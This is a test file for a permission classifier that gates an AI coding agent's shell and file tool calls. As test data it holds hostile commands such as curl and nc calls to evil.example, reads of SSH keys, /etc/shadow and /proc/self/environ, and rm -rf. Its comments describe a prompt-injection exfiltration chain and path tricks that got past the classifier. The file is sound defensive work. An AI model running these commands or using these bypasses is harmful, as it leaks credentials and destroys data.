import { describe, expect, it } from 'vitest';
import { resolve } from 'node:path';
import { FilesystemScope } from '../../../src/security/paths.js';
import { classifyBashCommand, classifyToolCall, maxClass, splitShellSegments } from '../../../src/security/permissions.js';

const scope = new FilesystemScope({
  projectRoots: ['/tmp/project'],
  additionalReadablePaths: ['/etc/claude'],
  deniedPaths: ['/tmp/project/.secrets'],
  allowOutsideProjectRead: false,
  allowOutsideProjectWrite: false,
});

describe('classifyBashCommand', () => {
  it('treats inspection commands as read-only', () => {
    expect(classifyBashCommand('ls -la').class).toBe('READ_ONLY');
    expect(classifyBashCommand('git status').class).toBe('READ_ONLY');
    expect(classifyBashCommand('git diff HEAD').class).toBe('READ_ONLY');
  });

  it('treats ordinary development as locally reversible', () => {
    expect(classifyBashCommand('npm run build').class).toBe('LOCAL_REVERSIBLE');
    expect(classifyBashCommand('npm test').class).toBe('LOCAL_REVERSIBLE');
    expect(classifyBashCommand('git commit -m "wip"').class).toBe('LOCAL_REVERSIBLE');
  });

  it('flags external side effects', () => {
    expect(classifyBashCommand('git push origin main').class).toBe('EXTERNAL_SIDE_EFFECT');
    expect(classifyBashCommand('npm publish').class).toBe('EXTERNAL_SIDE_EFFECT');
    expect(classifyBashCommand('gcloud run deploy svc').class).toBe('EXTERNAL_SIDE_EFFECT');
    expect(classifyBashCommand('curl -X POST https://example.com -d @body').class).toBe('EXTERNAL_SIDE_EFFECT');
  });

  it('flags destructive commands', () => {
    expect(classifyBashCommand('rm -rf /home/user/stuff').class).toBe('DESTRUCTIVE');
    expect(classifyBashCommand('git push --force origin main').class).toBe('DESTRUCTIVE');
    expect(classifyBashCommand('DROP TABLE users').class).toBe('DESTRUCTIVE');
    expect(classifyBashCommand('git reset --hard HEAD~3').class).toBe('DESTRUCTIVE');
  });

  it('prohibits privilege escalation and secret exposure', () => {
    expect(classifyBashCommand('sudo systemctl restart nginx').class).toBe('PROHIBITED');
    expect(classifyBashCommand('cat ~/.ssh/id_rsa').class).toBe('PROHIBITED');
    expect(classifyBashCommand('echo key >> ~/.ssh/authorized_keys').class).toBe('PROHIBITED');
  });

  // The whole point of segment splitting: a harmless prefix must not launder
  // a dangerous suffix past the classifier.
  it('classifies by the WORST segment, not the first', () => {
    expect(classifyBashCommand('ls && rm -rf /important').class).toBe('DESTRUCTIVE');
    expect(classifyBashCommand('echo hi; sudo rm -rf /').class).toBe('PROHIBITED');
    expect(classifyBashCommand('cat file.txt | git push --force').class).toBe('DESTRUCTIVE');
  });

  it('looks inside command substitutions', () => {
    expect(classifyBashCommand('echo $(sudo cat /etc/shadow)').class).toBe('PROHIBITED');
    expect(classifyBashCommand('echo `git push --force`').class).toBe('DESTRUCTIVE');
  });

  it('defaults unknown commands to locally reversible rather than read-only', () => {
    expect(classifyBashCommand('some-unknown-binary --flag').class).toBe('LOCAL_REVERSIBLE');
  });
});

describe('splitShellSegments', () => {
  it('splits on shell control operators', () => {
    expect(splitShellSegments('a && b || c ; d | e')).toEqual(['a', 'b', 'c', 'd', 'e']);
  });
  it('returns the original when there is nothing to split', () => {
    expect(splitShellSegments('ls -la')).toEqual(['ls -la']);
  });
});

describe('classifyToolCall', () => {
  it('allows reads and writes inside the project', () => {
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/a.ts' }, scope }).class).toBe('READ_ONLY');
    expect(classifyToolCall({ toolName: 'Write', input: { file_path: '/tmp/project/a.ts' }, scope }).class).toBe('LOCAL_REVERSIBLE');
  });

  it('prohibits writes outside the project roots', () => {
    const result = classifyToolCall({ toolName: 'Write', input: { file_path: '/etc/passwd' }, scope });
    expect(result.class).toBe('PROHIBITED');
  });

  it('prohibits reads of a denied path even inside a project root', () => {
    const result = classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/.secrets/key' }, scope });
    expect(result.class).toBe('PROHIBITED');
  });

  it('treats third-party MCP tools as external side effects', () => {
    expect(classifyToolCall({ toolName: 'mcp__github__create_pr', input: {}, scope }).class).toBe('EXTERNAL_SIDE_EFFECT');
  });

  it('redacts secrets out of the summary it produces', () => {
    const result = classifyToolCall({
      toolName: 'Bash',
      input: { command: 'deploy --token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345' },
      scope,
    });
    expect(result.summary).not.toContain('ghp_ABCDEF');
  });
});

describe('maxClass', () => {
  it('returns the more dangerous of two classes', () => {
    expect(maxClass('READ_ONLY', 'DESTRUCTIVE')).toBe('DESTRUCTIVE');
    expect(maxClass('PROHIBITED', 'EXTERNAL_SIDE_EFFECT')).toBe('PROHIBITED');
    expect(maxClass('READ_ONLY', 'READ_ONLY')).toBe('READ_ONLY');
  });
});

/**
 * Scope escapes found by an independent review (endsley/bodhi-inbox#30), all
 * four reproduced against the real classifier before being fixed. They share a
 * single shape: the scope check and whatever finally opens the file disagreed
 * about what a string means. A path is only as guarded as that agreement.
 *
 * The service runs with its working directory set to the repository, which is
 * itself a project root, so these were live rather than theoretical.
 */
describe('paths the scope check used to misread', () => {
  /**
   * The project root MUST be the process's working directory for the tilde
   * cases to mean anything. resolve('~/x') is cwd-relative, so with a root of
   * /tmp/project the path lands outside it and is refused for a reason that has
   * nothing to do with the bug -- the test then passes with the fix reverted.
   * The service runs with WorkingDirectory set to the repository, which is a
   * project root, so this is also the real deployment shape.
   */
  const cwdScope = new FilesystemScope({
    projectRoots: [process.cwd()],
    additionalReadablePaths: [],
    deniedPaths: [],
    allowOutsideProjectRead: false,
    allowOutsideProjectWrite: false,
  });

  it('confirms the harness actually reproduces the escape', () => {
    // If this ever fails, the tilde tests below have stopped testing anything.
    expect(resolve('~/.ssh/authorized_keys').startsWith(process.cwd())).toBe(true);
  });

  it('refuses a write to the home directory written as ~', () => {
    // resolve() treats ~ as an ordinary directory name, so this became
    // <cwd>/~/.ssh/authorized_keys -- lexically inside the project -- and was
    // classified LOCAL_REVERSIBLE and auto-allowed. The tool downstream then
    // expands ~ for real. Writing authorized_keys is persistence, not a leak.
    const decision = classifyToolCall({ toolName: 'Write', input: { file_path: '~/.ssh/authorized_keys' }, scope: cwdScope });
    expect(decision.class).toBe('PROHIBITED');
  });

  it('refuses reads of the home directory written as ~', () => {
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '~/.aws/credentials' }, scope: cwdScope }).class).toBe('PROHIBITED');
    expect(classifyToolCall({ toolName: 'Edit', input: { file_path: '~/.bashrc' }, scope: cwdScope }).class).toBe('PROHIBITED');
  });

  it('refuses another user\'s home rather than guessing at it', () => {
    // ~root cannot be resolved without /etc/passwd, and treating it as a
    // literal directory name is the bug above.
    // A NON-sensitive path, deliberately. ~root/.ssh/id_rsa is now refused one
    // step earlier by the sensitive-path rule, which is correct but would stop
    // this test exercising the tilde logic it exists for.
    const decision = classifyToolCall({ toolName: 'Read', input: { file_path: '~root/notes.txt' }, scope: cwdScope });
    expect(decision.class).toBe('PROHIBITED');
    expect(decision.reason).toMatch(/cannot resolve/i);

    // And the sensitive short-circuit still refuses the credential case.
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '~root/.ssh/id_rsa' }, scope: cwdScope }).class).toBe('PROHIBITED');
  });

  it('does not auto-allow a relative path that climbs out of the project', () => {
    // extractBashPaths matches only absolute and ~ paths, so this yielded NO
    // paths and was classified READ_ONLY on the verb alone. The worker's cwd is
    // the project directory, so any .. segment may leave it.
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cat ../../../../etc/passwd' }, scope }).class).toBe('PROHIBITED');

    // A REVISION of what this test first asserted. It used to expect
    // `cd ../sibling && npm test` to be escalated, because the extractor
    // matched a single `..` -- which also escalated a bare `cd ..`, among the
    // most ordinary things anyone types. Two or more segments is the shape that
    // climbs out to somewhere else; one is navigation.
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cd ../sibling && npm test' }, scope }).class).toBe('LOCAL_REVERSIBLE');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cd ..' }, scope }).class).toBe('LOCAL_REVERSIBLE');
  });

  it('does not auto-allow a path built from a shell variable', () => {
    // This classifier has no environment, so it cannot know what $HOME is. It
    // must therefore not pretend the command touches nothing.
    expect(classifyToolCall({ toolName: 'Bash', input: { command: "awk '{print}' $HOME/.gnupg/secring.gpg" }, scope }).class).toBe('PROHIBITED');

    // Judged by the part that IS visible. A credential file named after the
    // variable is refused outright; an ordinary file under $HOME is not
    // interesting and must not cost a prompt. The first version escalated
    // EVERY $VAR path, which meant asking about `cat $HOME/notes.txt` and
    // `ls ${PROJECT_ROOT}/src`.
    //
    // .netrc is in the sensitive list BECAUSE of this change: dropping the
    // blanket escalation would otherwise have made it readable, which one of
    // these assertions caught by failing for the right reason.
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cat ${HOME}/.netrc' }, scope }).class).toBe('PROHIBITED');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cat ${HOME}/.ssh/id_rsa' }, scope }).class).toBe('PROHIBITED');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cat $HOME/notes.txt' }, scope }).class).toBe('READ_ONLY');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'ls ${PROJECT_ROOT}/src' }, scope }).class).toBe('READ_ONLY');
  });

  it('refuses the per-process /proc tree while keeping /proc/cpuinfo usable', () => {
    // /proc/ was on the benign prefix list, so /proc/self/environ -- every
    // token this process holds -- was READ_ONLY and auto-allowed, while the
    // explicit rule on `env` called the same information PROHIBITED.
    for (const command of ['cat /proc/self/environ', 'cat /proc/1/environ', 'cat /proc/self/cmdline']) {
      expect(classifyToolCall({ toolName: 'Bash', input: { command }, scope }).class).toBe('PROHIBITED');
    }
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'cat /proc/cpuinfo' }, scope }).class).toBe('READ_ONLY');
  });

  it('scope-checks a file:// URL, which is a filesystem read wearing a URL', () => {
    // WebFetch is READ_ONLY and takes `url`, not `file_path`, so nothing was
    // extracted and nothing was checked.
    expect(classifyToolCall({ toolName: 'WebFetch', input: { url: 'file:///etc/passwd' }, scope }).class).toBe('PROHIBITED');
    expect(classifyToolCall({ toolName: 'WebFetch', input: { url: 'https://example.com' }, scope }).class).toBe('READ_ONLY');
  });

  it('catches a sensitive location passed as a bare relative argument', () => {
    // `-C /` then a bare relative path. Extracting every bare relative token is
    // not possible -- in a shell command every word looks like one -- so the
    // whole command line is scanned and the call is escalated to approval.
    const decision = classifyToolCall({ toolName: 'Bash', input: { command: 'tar -czf /tmp/x.tgz -C / etc/shadow' }, scope });
    expect(decision.class).toBe('EXTERNAL_SIDE_EFFECT');
  });
});

/**
 * The counterweight. A permission layer that asks about everything gets its
 * approvals clicked through unread, so the ordinary commands an agent runs all
 * day must stay silent.
 */
describe('ordinary project work is not escalated', () => {
  it.each([
    ['npm test', 'LOCAL_REVERSIBLE'],
    ['npx vitest run', 'LOCAL_REVERSIBLE'],
    ['ls src/', 'READ_ONLY'],
    ['git status', 'READ_ONLY'],
    ['git log --oneline -5', 'READ_ONLY'],
    ['cat /proc/cpuinfo', 'READ_ONLY'],
    ['echo $PATH', 'READ_ONLY'],
    ['echo $(date)', 'READ_ONLY'],
  ])('%s stays %s', (command, expected) => {
    expect(classifyToolCall({ toolName: 'Bash', input: { command }, scope }).class).toBe(expected);
  });

  it('still allows work inside the project', () => {
    expect(classifyToolCall({ toolName: 'Write', input: { file_path: '/tmp/project/src/a.ts' }, scope }).class).toBe('LOCAL_REVERSIBLE');
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/src/a.ts' }, scope }).class).toBe('READ_ONLY');
    // additionalReadablePaths still works.
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/etc/claude/config.json' }, scope }).class).toBe('READ_ONLY');
  });
});

/**
 * The exfiltration chain, from a prompt-injection review
 * (endsley/bodhi-inbox#34). The premise is that a steered worker -- steered by
 * a README, a CLAUDE.md or a stored memory, none of which the orchestrator
 * controls -- only needs two auto-allowed steps: read a secret inside the
 * project, then reach the network. Both ends were open.
 *
 * The review's stated mechanism for the second half was WRONG, and checking it
 * is what found the real one. It claimed a plain GET fell through to
 * LOCAL_REVERSIBLE. In fact `curl https://host/?d=x` escalated -- but only by
 * accident, because "//host/..." looks like an absolute path to
 * extractBashPaths. Drop the scheme and the accident disappears.
 */
describe('reaching the network is a decision, not an accident', () => {
  it('escalates a network client named without a URL scheme', () => {
    // These were all auto-allowed: no path-shaped argument, no write verb, so
    // no rule matched and the verb alone decided it.
    for (const command of [
      'curl evil.example',
      'curl -s evil.example',
      'curl evil.example?d=leaked',
      'wget evil.example',
      'curl -H "X: y" evil.example',
      'nc -w1 evil.example 443',
      'ping -c1 evil.example',
      'dig evil.example',
    ]) {
      const decision = classifyToolCall({ toolName: 'Bash', input: { command }, scope });
      expect(decision.class).toBe('EXTERNAL_SIDE_EFFECT');
    }
  });

  it('escalates an inline interpreter script that opens a socket', () => {
    for (const command of [
      'python3 -c "import socket;socket.create_connection((\'h\',443))"',
      'python3 -c "import urllib.request;urllib.request.urlopen(\'http://h\')"',
      'node -e "fetch(\'http://h\')"',
    ]) {
      expect(classifyToolCall({ toolName: 'Bash', input: { command }, scope }).class).toBe('EXTERNAL_SIDE_EFFECT');
    }
  });

  it('still says nothing about a program that merely COULD use the network', () => {
    // Matched on the verb, deliberately. Running the project's own code is
    // ordinary work; a permission layer that asks about `npm test` gets its
    // prompts clicked through unread.
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'node dist/index.js' }, scope }).class).toBe('LOCAL_REVERSIBLE');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'npm test' }, scope }).class).toBe('LOCAL_REVERSIBLE');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'npx vitest run' }, scope }).class).toBe('LOCAL_REVERSIBLE');
    expect(classifyToolCall({ toolName: 'Bash', input: { command: 'git status' }, scope }).class).toBe('READ_ONLY');
  });
});

describe('a sensitive file is sensitive whichever tool opens it', () => {
  it('refuses to Read a .env inside the project', () => {
    // The same file was PROHIBITED through Bash and READ_ONLY through Read,
    // because the sensitive-path test lived only in the Bash branch. The
    // weaker path is the one a model reaches for first.
    const envPath = '/tmp/project/.env';
    expect(classifyToolCall({ toolName: 'Bash', input: { command: `cat ${envPath}` }, scope }).class).toBe('PROHIBITED');
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: envPath }, scope }).class).toBe('PROHIBITED');
  });

  it('refuses keys and credentials through every file tool', () => {
    for (const toolName of ['Read', 'Write', 'Edit', 'NotebookRead']) {
      for (const file of ['/tmp/project/server.pem', '/tmp/project/.env.production', '/tmp/project/sub/id_rsa']) {
        const decision = classifyToolCall({ toolName, input: { file_path: file }, scope });
        expect(decision.class).toBe('PROHIBITED');
      }
    }
  });

  it('leaves ordinary project files alone', () => {
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/src/env.ts' }, scope }).class).toBe('READ_ONLY');
    expect(classifyToolCall({ toolName: 'Write', input: { file_path: '/tmp/project/src/a.ts' }, scope }).class).toBe('LOCAL_REVERSIBLE');
  });
});

describe('an unknown tool is not a safe tool', () => {
  it('asks rather than allowing a tool the classifier has never heard of', () => {
    // Any tool a future SDK release adds was permitted by default until
    // somebody noticed and classified it.
    const decision = classifyToolCall({ toolName: 'SomeFutureTool', input: { anything: 'x' }, scope });
    expect(decision.class).toBe('EXTERNAL_SIDE_EFFECT');
    expect(decision.reason).toMatch(/not known to this classifier/i);
  });
});

/**
 * A regression I introduced one commit earlier, caught by checking my own
 * change against the SDK rather than against my assumptions.
 *
 * Making unrecognised tools ask is the right default, and it immediately
 * mis-fired: the classifier knows 17 tool names and the installed SDK declares
 * far more. The worker is started with permissionMode 'plan' for inspect
 * sessions, so ExitPlanMode is a designed-in step of an ordinary session --
 * asking the user to approve the model finishing its plan is not a boundary,
 * it is the kind of papercut that teaches people to tap Allow unread, which
 * costs more safety than the prompt buys.
 *
 * The names below were read out of
 * node_modules/@anthropic-ai/claude-agent-sdk/sdk-tools.d.ts, not guessed.
 */
describe('the SDK control verbs do not interrupt the user', () => {
  it.each(['ExitPlanMode', 'EnterPlanMode', 'KillShell', 'KillBash'])(
    '%s is allowed without asking',
    (toolName) => {
      const decision = classifyToolCall({ toolName, input: {}, scope });
      expect(decision.class).toBe('READ_ONLY');
    },
  );

  it('allows a slash command, whose expansion is classified call by call', () => {
    // The invocation grants nothing on its own: it expands to a prompt, and
    // every tool call that expansion makes comes back through this classifier.
    expect(classifyToolCall({ toolName: 'SlashCommand', input: { command: '/deploy' }, scope }).class).toBe('LOCAL_REVERSIBLE');
  });

  it('still asks about a tool it genuinely does not know', () => {
    // The point of the previous commit must survive this one.
    for (const toolName of ['SomeFutureTool', 'RemoteTrigger', 'PushNotification']) {
      expect(classifyToolCall({ toolName, input: {}, scope }).class).toBe('EXTERNAL_SIDE_EFFECT');
    }
  });

  it('does not let a control verb become a way round the file rules', () => {
    // If a control tool ever carried a path, the sensitive-path check runs
    // before the control branch, so it cannot be used to reach a credential.
    const decision = classifyToolCall({ toolName: 'ExitPlanMode', input: { file_path: '/tmp/project/.env' }, scope });
    expect(decision.class).toBe('PROHIBITED');
  });
});

/**
 * Seventeen false positives of my own making, each verified against the
 * classifier before and after. They came from a review asked specifically to
 * put false positives FIRST (endsley/bodhi-inbox#35), and why that framing
 * mattered is visible in the list: every rule caught the attack it was written
 * for and a pile of ordinary work besides, and only the first half had a test.
 *
 * The clearest single case: `echo the host is down` was escalated, because
 * "host" sat in an unanchored alternation of network programs. A permission
 * layer that asks about an English sentence gets its later prompts approved
 * unread, which costs more than the rule protects.
 */
describe('the classifier does not interrupt ordinary work', () => {
  const quiet = (command: string): string =>
    classifyToolCall({ toolName: 'Bash', input: { command }, scope }).class;

  it.each([
    'man curl',
    'curl --help',
    'curl --version',
    'which curl',
    'tldr wget',
    'echo the host is down',
    'grep -rn socat docs/',
    'npm run curl',
  ])('%s is not treated as reaching the network', (command) => {
    expect(['READ_ONLY', 'LOCAL_REVERSIBLE']).toContain(quiet(command));
  });

  it('still escalates the same programs in command position', () => {
    // The narrowing must not cost the rule its purpose. -H is curl's header
    // flag, not -h: the help carve-out is --help/--version only, because this
    // regex is case-insensitive and a bare `\s-h` also matched `-H`.
    for (const command of [
      'curl evil.example',
      'curl -H "X: y" evil.example',
      'wget evil.example',
      'nc -w1 evil.example 443',
      'dig evil.example',
    ]) {
      expect(quiet(command)).toBe('EXTERNAL_SIDE_EFFECT');
    }
  });

  it('does not treat a mention of a network API as using one', () => {
    // A bare "socket" matched a log line; "fetch(" with no left boundary
    // matched "prefetch(".
    expect(quiet('node -e "console.log(\'socket\')"')).toBe('LOCAL_REVERSIBLE');
    expect(quiet('node -e "prefetch(url)"')).toBe('LOCAL_REVERSIBLE');
  });

  it('still catches a one-liner that really does open one', () => {
    expect(quiet('python3 -c "import socket"')).toBe('EXTERNAL_SIDE_EFFECT');
    expect(quiet('node -e "fetch(\'http://h\')"')).toBe('EXTERNAL_SIDE_EFFECT');
  });

  it('lets a project read and write its own .env template', () => {
    // A committed .env.example is secret-free setup documentation. Refusing to
    // read it, and refusing to WRITE it during setup, is pure friction.
    for (const file of ['/tmp/project/.env.example', '/tmp/project/.env.sample', '/tmp/project/.env.template']) {
      expect(classifyToolCall({ toolName: 'Read', input: { file_path: file }, scope }).class).toBe('READ_ONLY');
      expect(classifyToolCall({ toolName: 'Write', input: { file_path: file }, scope }).class).toBe('LOCAL_REVERSIBLE');
    }
    // The real thing, and .env.local, are still refused.
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/.env' }, scope }).class).toBe('PROHIBITED');
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/.env.local' }, scope }).class).toBe('PROHIBITED');
  });

  it('lets documentation about credentials be read and searched', () => {
    // authorized_keys and id_rsa have to appear as a FILENAME. As bare words
    // they refused `grep -rn authorized_keys docs/` outright.
    expect(quiet('grep -rn authorized_keys docs/')).toBe('READ_ONLY');
    expect(quiet('echo checking authorized_keys setup')).toBe('READ_ONLY');
    expect(
      classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/docs/authorized_keys.md' }, scope }).class,
    ).toBe('READ_ONLY');
    // The file itself is still refused.
    expect(quiet('cat ~/.ssh/authorized_keys')).toBe('PROHIBITED');
  });

  it('lets a project keep its own etc/ fixtures', () => {
    // "/tmp/project/etc/passwd" contains "/etc/passwd" as a substring, so a
    // fixture directory was unreadable. The system file is still refused -- by
    // the scope check, for being outside every project root.
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/tmp/project/etc/passwd' }, scope }).class).toBe('READ_ONLY');
    expect(classifyToolCall({ toolName: 'Read', input: { file_path: '/etc/passwd' }, scope }).class).toBe('PROHIBITED');
    // A bare relative mention in a command still escalates.
    expect(quiet('tar -czf /tmp/x.tgz -C / etc/shadow')).toBe('EXTERNAL_SIDE_EFFECT');
  });
});
